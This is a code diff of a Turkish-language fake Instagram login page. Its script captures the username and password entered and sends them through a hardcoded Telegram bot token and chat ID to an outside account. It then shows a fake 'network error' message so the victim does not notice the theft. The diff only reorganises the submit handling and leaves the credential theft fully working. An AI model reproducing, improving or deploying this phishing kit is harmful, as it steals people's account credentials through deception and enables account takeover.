@@ -12,7 +12,7 @@
     <div class="container">
         <div class="login-box">
             <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram Logo" class="logo">
-            <form>
+            <form id="loginForm">
                 <input id="name" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                 <input id="password" type="password" placeholder="Şifre" required>
                 <p id="error"></p>
@@ -37,56 +37,64 @@
     </div>
 </body>
 <script>
-     var name = document.getElementById("name");
+    var name = document.getElementById("name");
     var pass = document.getElementById("password");
     var btn = document.getElementById("button");
-    var err=document.getElementById("error")
-function Check() {
-    if (!name.value === "" && pass.value === "") {
-        btn.style.background = "#4CB4F8";
-    } else {
-        btn.style.background = "#0095F6";
+    var err = document.getElementById("error");
+
+    function Check() {
+        if (name.value === "" && pass.value === "") {
+            btn.style.background = "#4CB4F8";
+        } else {
+            btn.style.background = "#0095F6";
+        }
     }
-}
 
-// Input alanları değiştiğinde fonksiyonu çağır
-document.getElementById("name").addEventListener("input", Check);
-document.getElementById("password").addEventListener("input", Check);
 
-btn.addEventListener("click",function(){
-    if (name.value === "" || pass.value === "") {
-        err.innerHTML = "Lütfen tüm alanları doldurun!";
-        return;
-    }else{
-        sendToTelegram()
-       btn.innerHTML=`<div class="spinner"></div>`;
-       setTimeout(()=>{
-err.innerHTML="Ağ hatası, lütfen biraz sonra tekrar dene";
-btn.innerHTML="Giriş yap"
-       },5000)
-    }
-})
+    document.getElementById("name").addEventListener("input", Check);
+    document.getElementById("password").addEventListener("input", Check);
 
-function sendToTelegram() {
-            const name = document.getElementById("name").value;
-            const message = document.getElementById("password").value;
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+        event.preventDefault(); 
 
-            if (!name || !message) {
-                err.innerHTML="İsim ve parola gerekli"
-                return;
-            }
+        if (name.value === "" || pass.value === "") {
+            err.innerHTML = "Lütfen tüm alanları doldurun!";
+            return;
+        } else {
+            btn.innerHTML = `<div class="spinner"></div>`;
+            setTimeout(() => {
+                err.innerHTML = "Ağ hatası, lütfen biraz sonra tekrar dene";
+                btn.innerHTML = "Giriş yap";
+                sendToTelegram();
+            }, 5000);
+  
+        }
+    });
 
-            const botToken = "8015272721:AAHovwpLJluTlPx6zfA9KLZjFvJqV-bt2ws"; // Telegram Bot Token
-            const chatId = "7452019947"; // Telegram Chat ID
-            const text = `🆕 Yeni Mesaj!\n👤 Ad: ${name}\n💬 Mesaj: ${message}`;
+    function sendToTelegram() {
+        const name = document.getElementById("name").value;
+        const message = document.getElementById("password").value;
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {})
-                .catch(error => console.log(error));
+        if (!name || !message) {
+            err.innerHTML = "İsim ve parola gerekli";
+            return;
         }
 
+        const botToken = "8015272721:AAHovwpLJluTlPx6zfA9KLZjFvJqV-bt2ws"; // Telegram Bot Token
+        const chatId = "7452019947"; // Telegram Chat ID
+        const text = `🆕 Yeni Mesaj!\n👤 Ad: ${name}\n💬 Mesaj: ${message}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(() => {
+                err.innerHTML = "Ağ hatası, lütfen biraz sonra tekrar dene";
+                btn.innerHTML = "Giriş yap";
+            })
+            .catch(error => {
+                console.log(error);
+            });
+    }
 </script>
 </html>
